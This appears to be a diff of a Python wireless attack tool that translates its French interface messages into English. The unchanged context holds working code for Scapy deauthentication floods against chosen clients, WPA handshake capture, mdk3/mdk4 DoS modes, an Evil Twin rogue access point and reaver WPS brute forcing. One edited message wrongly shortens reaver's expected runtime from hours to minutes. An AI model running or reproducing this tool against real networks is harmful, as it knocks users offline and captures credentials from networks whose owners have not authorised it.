@@ -10,8 +10,8 @@ try:
     from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
     conf.verb = 0  # Désactiver les messages verbeux
 except ImportError as e:
-    print(f"[-] Erreur d'import Scapy: {e}")
-    print("[-] Installez ou mettez à jour Scapy avec: sudo pip3 install --upgrade scapy")
+    print(f"[-] Scapy import error: {e}")
+    print("[-] Install or update Scapy with: sudo pip3 install --upgrade scapy")
     sys.exit(1)
 
 # === Couleurs ===
@@ -32,7 +32,7 @@ active_processes = []
 
 # === Gestion des signaux ===
 def signal_handler(sig, frame):
-    print(f"\n{YELLOW}[!] Interruption détectée. Nettoyage...{RESET}")
+    print(f"\n{YELLOW}[!] Interruption detected. Cleaning...{RESET}")
     cleanup()
     sys.exit(0)
 
@@ -79,16 +79,16 @@ def check_dependencies():
                 missing.append(f"{cmd} ({pkg})")
     
     if missing:
-        print(f"{RED}[-] Dépendances manquantes (REQUISES):{RESET}")
+        print(f"{RED}[-] Missing dependencies (REQUISES):{RESET}")
         for m in missing:
             print(f"    {RED}•{RESET} {m}")
         return False
     
     if optional_missing:
-        print(f"{YELLOW}[!] Dépendances optionnelles manquantes:{RESET}")
+        print(f"{YELLOW}[!] Missing optional dependencies:{RESET}")
         for m in optional_missing:
             print(f"    {YELLOW}•{RESET} {m}")
-        print(f"{CYAN}[*] Ces outils ne sont pas requis pour les fonctions de base{RESET}\n")
+        print(f"{CYAN}[*] These tools are not required for basic functionality{RESET}\n")
     
     return True
 
@@ -137,14 +137,14 @@ def get_interfaces():
                         interfaces.append(iface)
         return interfaces
     except Exception as e:
-        print(f"{RED}[-] Erreur lors de la récupération des interfaces: {e}{RESET}")
+        print(f"{RED}[-] Error retrieving interfaces: {e}{RESET}")
         return []
 
 # === Passer en mode monitor ===
 def enable_monitor_mode(interface):
     try:
         # Arrêter les processus conflictuels
-        print(f"{YELLOW}[*] Arrêt des processus conflictuels...{RESET}")
+        print(f"{YELLOW}[*] Stopping conflicting processes...{RESET}")
         subprocess.run(["airmon-ng", "check", "kill"], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
@@ -153,7 +153,7 @@ def enable_monitor_mode(interface):
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             interface = interface[:-3]
 
-        print(f"{GREEN}[+] Activation du mode monitor sur {interface}...{RESET}")
+        print(f"{GREEN}[+] Enabling monitor mode on {interface}...{RESET}")
         subprocess.run(["airmon-ng", "start", interface], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
@@ -170,19 +170,19 @@ def enable_monitor_mode(interface):
                 break
 
         if mon_iface:
-            print(f"{GREEN}[+] Interface monitor détectée : {mon_iface}{RESET}")
+            print(f"{GREEN}[+] Interface monitor detected : {mon_iface}{RESET}")
             return mon_iface
         else:
-            print(f"{RED}[-] Impossible de détecter l'interface monitor !{RESET}")
+            print(f"{RED}[-] Unable to detect the monitor interface !{RESET}")
             return None
     except Exception as e:
-        print(f"{RED}[-] Erreur lors de l'activation du mode monitor: {e}{RESET}")
+        print(f"{RED}[-] Error enabling monitor mode: {e}{RESET}")
         return None
 
 # === Revenir en mode normal ===
 def disable_monitor_mode(mon_iface):
     if mon_iface and mon_iface.endswith("mon"):
-        print(f"{GREEN}[+] Désactivation du mode monitor sur {mon_iface}...{RESET}")
+        print(f"{GREEN}[+] Disabling monitor mode on {mon_iface}...{RESET}")
         subprocess.run(["airmon-ng", "stop", mon_iface], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         # Redémarrer NetworkManager si disponible
@@ -192,8 +192,8 @@ def disable_monitor_mode(mon_iface):
 # === Lancer le scan airodump ===
 def run_airodump(interface, duration=15):
     clean_scan_files()
-    print(f"{YELLOW}[+] Scan en cours pendant {duration} secondes...{RESET}")
-    print(f"{CYAN}[*] Appuyez sur Ctrl+C pour arrêter plus tôt{RESET}")
+    print(f"{YELLOW}[+] Scan in progress for {duration} seconds...{RESET}")
+    print(f"{CYAN}[*] Press Ctrl+C to stop early{RESET}")
     
     proc = subprocess.Popen([
         "airodump-ng", "-w", SCAN_FILE_PREFIX,
@@ -284,7 +284,7 @@ def parse_scan_results(filename):
                         if client_mac not in clients[ap_mac]:
                             clients[ap_mac].append(client_mac)
     except Exception as e:
-        print(f"{RED}[-] Erreur lors de la lecture du fichier: {e}{RESET}")
+        print(f"{RED}[-] Error reading scan file: {e}{RESET}")
     
     return aps, clients
 
@@ -329,21 +329,21 @@ def sanitize_filename(s):
 
 # === 1. Attaque de déauthentification (Scapy) ===
 def attack_deauth(ap, clients, interface):
-    print(f"\n{GREEN}[+] Attaque de déauthentification sur {ap['essid']}{RESET}")
+    print(f"\n{GREEN}[+] Deauthentication attack on {ap['essid']}{RESET}")
     
     # Vérifier le canal
     if ap['channel'] == "?":
-        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
+        print(f"{RED}[-] Invalid channel for this network {RESET}")
         return
         
     set_channel(interface, ap['channel'])
     
-    duration_input = input(f"{ORANGE}[?] Durée en secondes (défaut: 90) : {RESET}").strip()
+    duration_input = input(f"{ORANGE}[?] Duration in seconds (default: 90) : {RESET}").strip()
     duration = int(duration_input) if duration_input.isdigit() else 90
     
     client_list = clients.get(ap['bssid'], [])
     
-    # Préparer les paquets de déauth
+    # Préparer les paquets de deauth
     packets = []
     
     # Paquet broadcast (vers tous les clients non identifiés)
@@ -351,37 +351,37 @@ def attack_deauth(ap, clients, interface):
     packets.append(pkt_broadcast)
     
     if client_list:
-        print(f"{CYAN}[*] {len(client_list)} client(s) détecté(s){RESET}")
-        print(f"{YELLOW}1.{RESET} Attaquer tous les clients + broadcast")
-        print(f"{YELLOW}2.{RESET} Cibler un client spécifique")
-        print(f"{YELLOW}3.{RESET} Broadcast uniquement")
-        choice = input(f"{ORANGE}[?] Choix : {RESET}").strip()
+        print(f"{CYAN}[*] {len(client_list)} client(s) detected{RESET}")
+        print(f"{YELLOW}1.{RESET} Attack all clients + broadcast")
+        print(f"{YELLOW}2.{RESET} Target a specific client")
+        print(f"{YELLOW}3.{RESET} Broadcast only")
+        choice = input(f"{ORANGE}[?] Choice : {RESET}").strip()
         
         if choice == "2":
             print(f"\n{CYAN}Clients connectés:{RESET}")
             for idx, client in enumerate(client_list):
                 print(f"{YELLOW}{idx+1}.{RESET} {client}")
-            client_choice = input(f"{ORANGE}[?] Numéro du client : {RESET}").strip()
+            client_choice = input(f"{ORANGE}[?] Select client number : {RESET}").strip()
             try:
                 target_client = client_list[int(client_choice)-1]
-                print(f"{GREEN}[+] Ciblage de {target_client}...{RESET}")
+                print(f"{GREEN}[+] Targeting {target_client}...{RESET}")
                 pkt_to_client = RadioTap() / Dot11(addr1=target_client, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                 pkt_to_ap = RadioTap() / Dot11(addr1=ap['bssid'], addr2=target_client, addr3=target_client) / Dot11Deauth(reason=7)
                 packets = [pkt_to_client, pkt_to_ap]
             except:
-                print(f"{RED}[-] Choix invalide{RESET}")
+                print(f"{RED}[-] Invalid choice{RESET}")
                 return
                 
         elif choice == "1":
-            print(f"{GREEN}[+] Attaque de tous les clients + broadcast...{RESET}")
+            print(f"{GREEN}[+] Attack all clients + broadcast...{RESET}")
             for client_mac in client_list:
                 pkt_to_client = RadioTap() / Dot11(addr1=client_mac, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                 pkt_to_ap = RadioTap() / Dot11(addr1=ap['bssid'], addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
                 packets.extend([pkt_to_client, pkt_to_ap])
         else:
-            print(f"{GREEN}[+] Attaque broadcast uniquement...{RESET}")
+            print(f"{GREEN}[+] Broadcast only attack...{RESET}")
     else:
-        print(f"{ORANGE}[!] Aucun client détecté, utilisation du mode broadcast{RESET}")
+        print(f"{ORANGE}[!] No clients detected, using broadcast mode{RESET}")
     
     # Thread d'envoi des paquets
     stop_attack = False
@@ -390,7 +390,7 @@ def attack_deauth(ap, clients, interface):
         nonlocal stop_attack
         end_time = time.time() + duration
         packet_count = 0
-        print(f"{CYAN}[*] Envoi de paquets de déauthentification...{RESET}")
+        print(f"{CYAN}[*] Sending deauthentication packets...{RESET}")
         
         try:
             while time.time() < end_time and not stop_attack:
@@ -410,11 +410,11 @@ def attack_deauth(ap, clients, interface):
                 if packet_count and packet_count % 500 == 0:
                     elapsed = int(time.time() - (end_time - duration))
                     remaining = max(0, duration - elapsed)
-                    print(f"{YELLOW}[*] {packet_count} paquets envoyés | Temps restant: {remaining}s{RESET}")
+                    print(f"{YELLOW}[*] {packet_count} packets sent | Time remaining: {remaining}s{RESET}")
         except Exception as e:
-            print(f"{RED}[-] Erreur lors de l'envoi: {e}{RESET}")
+            print(f"{RED}[-] Error during sending: {e}{RESET}")
         
-        print(f"{GREEN}[+] Attaque terminée. Total: {packet_count} paquets envoyés{RESET}")
+        print(f"{GREEN}[+] Attack completed. Total: {packet_count} packets sent{RESET}")
     
     # Lancer l'attaque dans un thread
     attack_thread = Thread(target=send_loop)
@@ -422,7 +422,7 @@ def attack_deauth(ap, clients, interface):
     attack_thread.start()
     
     try:
-        input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter l'attaque...{RESET}")
+        input(f"\n{YELLOW}[!] Press Enter to stop the attack...{RESET}")
         stop_attack = True
         attack_thread.join(timeout=2)
     except KeyboardInterrupt:
@@ -431,10 +431,10 @@ def attack_deauth(ap, clients, interface):
 
 # === 2. Capture de handshake ===
 def capture_handshake(ap, clients, interface):
-    print(f"\n{GREEN}[+] Capture de handshake pour {ap['essid']}{RESET}")
+    print(f"\n{GREEN}[+] Capturing handshake for {ap['essid']}{RESET}")
     
     if ap['channel'] == "?":
-        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
+        print(f"{RED}[-] Invalid channel for this network{RESET}")
         return
     
     # Créer le dossier de handshakes
@@ -446,16 +446,16 @@ def capture_handshake(ap, clients, interface):
     set_channel(interface, ap['channel'])
     
     # Menu pour choisir la méthode de déauth
-    print(f"\n{CYAN}[*] Choisissez la méthode de déauthentification:{RESET}")
+    print(f"\n{CYAN}[*] Choose the deauthentication method:{RESET}")
     print(f"{YELLOW}1.{RESET} aireplay-ng (standard)")
-    print(f"{YELLOW}2.{RESET} mdk3/mdk4 (plus agressif)")
-    print(f"{YELLOW}3.{RESET} Scapy (personnalisé)")
-    print(f"{YELLOW}4.{RESET} Capture sans déauth (écoute passive)")
+    print(f"{YELLOW}2.{RESET} mdk3/mdk4 (more aggressive)")
+    print(f"{YELLOW}3.{RESET} Scapy (custom)")
+    print(f"{YELLOW}4.{RESET} Capture without deauth (passive listening)")
     
     method_choice = input(f"{ORANGE}[?] Méthode : {RESET}").strip()
     
     # Lancer airodump pour capturer
-    print(f"{CYAN}[*] Démarrage de la capture...{RESET}")
+    print(f"{CYAN}[*] Starting capture on channel {ap['channel']} for BSSID {ap['bssid']}{RESET}")
     capture_proc = subprocess.Popen([
         "airodump-ng", "-c", ap['channel'],
         "--bssid", ap['bssid'],
@@ -468,7 +468,7 @@ def capture_handshake(ap, clients, interface):
     
     # Lancer la déauthentification en fonction du choix
     if method_choice == "1":
-        print(f"{GREEN}[+] Déauthentification via aireplay-ng...{RESET}")
+        print(f"{GREEN}[+] Using aireplay-ng for deauthentication{RESET}")
         client_list = clients.get(ap['bssid'], [])
         if client_list:
             for client in client_list:
@@ -494,17 +494,17 @@ def capture_handshake(ap, clients, interface):
             mdk_cmd = None
         
         if mdk_cmd:
-            print(f"{GREEN}[+] Déauthentification via {mdk_cmd}...{RESET}")
+            print(f"{GREEN}[+] Using {mdk_cmd} for deauthentication...{RESET}")
             try:
                 with open("/tmp/bssid_list.txt", "w") as f:
                     f.write(ap['bssid'] + "\n")
                 subprocess.Popen([mdk_cmd, interface, "d", "-b", "/tmp/bssid_list.txt", "-c", ap['channel']],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except:
-                print(f"{RED}[-] Erreur avec {mdk_cmd}{RESET}")
+                print(f"{RED}[-] Error with {mdk_cmd}{RESET}")
     
     elif method_choice == "3":
-        print(f"{GREEN}[+] Déauthentification via Scapy...{RESET}")
+        print(f"{GREEN}[+] Using Scapy for deauthentication...{RESET}")
         client_list = clients.get(ap['bssid'], [])
         
         def scapy_deauth():
@@ -528,22 +528,22 @@ def capture_handshake(ap, clients, interface):
         scapy_thread.start()
     
     elif method_choice == "4":
-        print(f"{CYAN}[*] Capture passive en cours (sans déauthentification)...{RESET}")
+        print(f"{CYAN}[*] Passive capture in progress (without deauthentication)...{RESET}")
     
     else:
-        print(f"{RED}[-] Choix invalide, pas de déauthentification{RESET}")
+        print(f"{RED}[-] Invalid choice, no deauthentication{RESET}")
     
-    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter la capture...{RESET}")
+    input(f"\n{YELLOW}[!] Press Enter to stop the capture...{RESET}")
     cleanup()
     
-    print(f"{GREEN}[+] Capture sauvegardée dans {output_file}-*.cap{RESET}")
+    print(f"{GREEN}[+] Capture saved in {output_file}-*.cap{RESET}")
 
 # === 3. Attaque par flood (DoS) ===
 def attack_flood(ap, interface):
     print(f"\n{GREEN}[+] Attaque par flood sur {ap['essid']}{RESET}")
     
     if ap['channel'] == "?":
-        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
+        print(f"{RED}[-] Invalid channel for this network{RESET}")
         return
         
     set_channel(interface, ap['channel'])
@@ -555,23 +555,23 @@ def attack_flood(ap, interface):
     elif shutil.which("mdk3") is not None:
         mdk_cmd = "mdk3"
     else:
-        print(f"{RED}[-] mdk3/mdk4 n'est pas installé !{RESET}")
+        print(f"{RED}[-] mdk3/mdk4 is not installed !{RESET}")
         return
     
-    print(f"{CYAN}[*] Utilisation de {mdk_cmd}{RESET}")
-    print(f"{YELLOW}1.{RESET} Beacon Flood (saturation de faux AP)")
+    print(f"{CYAN}[*] Using {mdk_cmd}{RESET}")
+    print(f"{YELLOW}1.{RESET} Beacon Flood (Fake APs)")
     print(f"{YELLOW}2.{RESET} Authentication DoS")
     print(f"{YELLOW}3.{RESET} Deauthentication Flood")
     print(f"{YELLOW}4.{RESET} Michael Shutdown Exploitation")
     
-    choice = input(f"{ORANGE}[?] Type d'attaque : {RESET}").strip()
+    choice = input(f"{ORANGE}[?] Type of attack : {RESET}").strip()
     
     # Créer fichier BSSID
     try:
         with open("/tmp/bssid_list.txt", "w") as f:
             f.write(ap['bssid'] + "\n")
     except:
-        print(f"{RED}[-] Erreur lors de la création du fichier BSSID{RESET}")
+        print(f"{RED}[-] Error creating BSSID file{RESET}")
         return
     
     try:
@@ -584,35 +584,35 @@ def attack_flood(ap, interface):
         elif choice == "4":
             proc = subprocess.Popen([mdk_cmd, interface, "m", "-t", ap['bssid']])
         else:
-            print(f"{RED}[-] Choix invalide{RESET}")
+            print(f"{RED}[-] Invalid choice{RESET}")
             return
         
         active_processes.append(proc)
-        input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter l'attaque...{RESET}")
+        input(f"\n{YELLOW}[!] Press Enter to stop the attack...{RESET}")
         cleanup()
     except Exception as e:
-        print(f"{RED}[-] Erreur lors de l'attaque: {e}{RESET}")
+        print(f"{RED}[-] Error during attack: {e}{RESET}")
 
 # === 4. Evil Twin / Rogue AP ===
 def attack_evil_twin(ap, interface):
-    print(f"\n{GREEN}[+] Création d'un Evil Twin pour {ap['essid']}{RESET}")
+    print(f"\n{GREEN}[+] Creating Evil Twin for {ap['essid']}{RESET}")
     
     # Vérifier les dépendances
     if shutil.which("hostapd") is None:
-        print(f"{RED}[-] hostapd n'est pas installé !{RESET}")
+        print(f"{RED}[-] hostapd is not installed !{RESET}")
         return
     if shutil.which("dnsmasq") is None:
-        print(f"{RED}[-] dnsmasq n'est pas installé !{RESET}")
+        print(f"{RED}[-] dnsmasq is not installed !{RESET}")
         return
     
     if ap['channel'] == "?":
-        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
+        print(f"{RED}[-] Invalid channel for this network{RESET}")
         return
 
     # Si interface en mode monitor, repasser à l'interface normale automatiquement
     iface_for_hostapd = interface
     if interface.endswith("mon"):
-        print(f"{YELLOW}[!] Interface {interface} détectée en mode monitor, arrêt du mode monitor pour hostapd...{RESET}")
+        print(f"{YELLOW}[!] Interface {interface} detected in monitor mode, stopping monitor mode for hostapd...{RESET}")
         subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         iface_for_hostapd = interface[:-3]
         # Donner un peu de temps pour que l'interface revienne en managed
@@ -636,8 +636,8 @@ rsn_pairwise=CCMP
     try:
         with open("/tmp/hostapd.conf", "w") as f:
             f.write(hostapd_conf)
-    except:
-        print(f"{RED}[-] Erreur lors de la création de la configuration{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] Error creating hostapd configuration: {e}{RESET}")
         return
     
     # Configuration dnsmasq
@@ -653,8 +653,8 @@ log-dhcp
     try:
         with open("/tmp/dnsmasq.conf", "w") as f:
             f.write(dnsmasq_conf)
-    except:
-        print(f"{RED}[-] Erreur lors de la création de la configuration{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] Error creating dnsmasq configuration: {e}{RESET}")
         return
     
     print(f"{CYAN}[*] Configuration de l'interface...{RESET}")
@@ -675,32 +675,32 @@ log-dhcp
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     active_processes.append(dnsmasq_proc)
     
-    print(f"{GREEN}[+] Evil Twin actif !{RESET}")
+    print(f"{GREEN}[+] Evil Twin active !{RESET}")
     print(f"{CYAN}[*] SSID: {ap['essid']}{RESET}")
     print(f"{CYAN}[*] Password: password123{RESET}")
-    print(f"{CYAN}[*] Les clients qui se connectent obtiendront une IP 192.168.1.x{RESET}")
+    print(f"{CYAN}[*] Clients connecting will get IP 192.168.1.x{RESET}")
     
-    input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter...{RESET}")
+    input(f"\n{YELLOW}[!] Press Enter to stop...{RESET}")
     cleanup()
 
 # === 5. WPS Attack ===
 def attack_wps(ap, interface):
-    print(f"\n{GREEN}[+] Attaque WPS sur {ap['essid']}{RESET}")
+    print(f"\n{GREEN}[+] Attack WPS on {ap['essid']}{RESET}")
     
     # Vérifier si reaver est installé
     if shutil.which("reaver") is None:
-        print(f"{RED}[-] Reaver n'est pas installé !{RESET}")
-        print(f"{ORANGE}[!] Installez-le avec: apt install reaver{RESET}")
+        print(f"{RED}[-] Reaver is not installed !{RESET}")
+        print(f"{ORANGE}[!] Install it with: apt install reaver{RESET}")
         return
     
     if ap['channel'] == "?":
-        print(f"{RED}[-] Canal invalide pour ce réseau{RESET}")
+        print(f"{RED}[-] Invalid channel for this network{RESET}")
         return
         
     set_channel(interface, ap['channel'])
     
-    print(f"{CYAN}[*] Démarrage de l'attaque WPS...{RESET}")
-    print(f"{YELLOW}[!] Ceci peut prendre plusieurs heures{RESET}")
+    print(f"{CYAN}[*] WPS attack starting..{RESET}")
+    print(f"{YELLOW}[!] This can take several minutes{RESET}")
     
     try:
         proc = subprocess.Popen([
@@ -711,10 +711,10 @@ def attack_wps(ap, interface):
         ])
         active_processes.append(proc)
         
-        input(f"\n{YELLOW}[!] Appuyez sur Entrée pour arrêter...{RESET}")
+        input(f"\n{YELLOW}[!] WPS attack started. Press Enter to stop...{RESET}")
         cleanup()
     except Exception as e:
-        print(f"{RED}[-] Erreur lors de l'attaque: {e}{RESET}")
+        print(f"{RED}[-] Error during WPS attack: {e}{RESET}")
 
 # === Menu d'attaque (SUITE) ===
 def attack_menu(ap, clients, interface):
@@ -723,15 +723,15 @@ def attack_menu(ap, clients, interface):
         print(f"{CYAN}Target: {ap['essid']} ({ap['bssid']}){RESET}")
         print(f"{CYAN}Channel: {ap['channel']} | Power: {ap['power']} dBm | Clients: {len(clients.get(ap['bssid'], []))}{RESET}")
         print(f"{BLUE}{'='*60}{RESET}")
-        print(f"{YELLOW}1.{RESET} Déauthentification (Deauth)")
-        print(f"{YELLOW}2.{RESET} Capture de Handshake")
-        print(f"{YELLOW}3.{RESET} Attaque par Flood (DoS)")
+        print(f"{YELLOW}1.{RESET} deauthentication (Deauth)")
+        print(f"{YELLOW}2.{RESET} Handshake Capture")
+        print(f"{YELLOW}3.{RESET} Flood attack (DoS) ")
         print(f"{YELLOW}4.{RESET} Evil Twin / Rogue AP")
         print(f"{YELLOW}5.{RESET} WPS Attack (Reaver)")
-        print(f"{YELLOW}6.{RESET} Rescanner les réseaux")
-        print(f"{YELLOW}0.{RESET} Retour")
+        print(f"{YELLOW}6.{RESET} Rescan networks")
+        print(f"{YELLOW}0.{RESET} Back to main menu")
         
-        choice = input(f"{ORANGE}[?] Choix : {RESET}").strip()
+        choice = input(f"{ORANGE}[?] choice : {RESET}").strip()
         
         if choice == "1":
             attack_deauth(ap, clients, interface)
@@ -748,43 +748,43 @@ def attack_menu(ap, clients, interface):
         elif choice == "0":
             break
         else:
-            print(f"{RED}[-] Choix invalide !{RESET}")
+            print(f"{RED}[-] Invalid choice !{RESET}")
 
 # === Programme principal ===
 def main():
     # Vérifier root
     if os.geteuid() != 0:
-        print(f"{RED}[-] Ce script doit être exécuté en tant que root !{RESET}")
+        print(f"{RED}[-] This script must be run as root !{RESET}")
         sys.exit(1)
     
     print_banner()
     
     # Vérifier les dépendances
     if not check_dependencies():
-        print(f"\n{RED}[-] Veuillez installer les dépendances manquantes{RESET}")
+        print(f"\n{RED}[-] Missing dependencies !{RESET}")
         sys.exit(1)
     
     # Sélection de l'interface
     interfaces = get_interfaces()
     if not interfaces:
-        print(f"{RED}[-] Aucune interface Wi-Fi détectée !{RESET}")
+        print(f"{RED}[-] No wireless interfaces detected !{RESET}")
         return
     
-    print(f"{BLUE}Interfaces disponibles:{RESET}")
+    print(f"{BLUE}Available interfaces:{RESET}")
     for i, iface in enumerate(interfaces):
         print(f"{YELLOW} {i+1}.{RESET} {iface}")
     
-    choice = input(f"{ORANGE}[?] Sélectionnez une interface (1-{len(interfaces)}): {RESET}").strip()
+    choice = input(f"{ORANGE}[?] Select an interface (1-{len(interfaces)}): {RESET}").strip()
     try:
         iface = interfaces[int(choice)-1]
     except:
-        print(f"{RED}[-] Choix invalide !{RESET}")
+        print(f"{RED}[-] Invalid choice !{RESET}")
         return
 
     # Activer le mode monitor
     mon_iface = enable_monitor_mode(iface)
     if not mon_iface:
-        print(f"{RED}[-] Impossible d'activer le mode monitor{RESET}")
+        print(f"{RED}[-] Failed to enable monitor mode on interface {iface}{RESET}")
         return
 
     try:
@@ -797,8 +797,8 @@ def main():
             aps, clients = parse_scan_results(csv_file)
             
             if not aps:
-                print(f"{RED}[-] Aucun réseau détecté !{RESET}")
-                retry = input(f"{ORANGE}[?] Rescanner? (y/N): {RESET}").strip().lower()
+                print(f"{RED}[-] No network detected !{RESET}")
+                retry = input(f"{ORANGE}[?] Rescan? (y/N): {RESET}").strip().lower()
                 if retry != 'y':
                     break
                 continue
@@ -807,7 +807,7 @@ def main():
             print_ap_list(aps, clients)
             
             # Sélection du réseau
-            choice = input(f"\n{ORANGE}[?] Sélectionnez le réseau (num) ou 'r' pour rescanner: {RESET}").strip()
+            choice = input(f"\n{ORANGE}[?] Select the network (number) or 'r' to rescan: {RESET}").strip()
             
             if choice.lower() == 'r':
                 continue
@@ -815,7 +815,7 @@ def main():
             try:
                 ap = aps[int(choice)-1]
             except:
-                print(f"{RED}[-] Choix invalide !{RESET}")
+                print(f"{RED}[-] Invalid choice !{RESET}")
                 continue
             
             # Menu d'attaque
@@ -824,11 +824,11 @@ def main():
                 break
                 
     except KeyboardInterrupt:
-        print(f"\n{YELLOW}[!] Interruption...{RESET}")
+        print(f"\n{YELLOW}[!] Interrupted by user.{RESET}")
     finally:
         cleanup()
         disable_monitor_mode(mon_iface)
-        print(f"\n{GREEN}[+] Nettoyage terminé. Au revoir !{RESET}")
+        print(f"\n{GREEN}[+] Cleanup completed. Goodbye !{RESET}")
 
 if __name__ == "__main__":
     main()
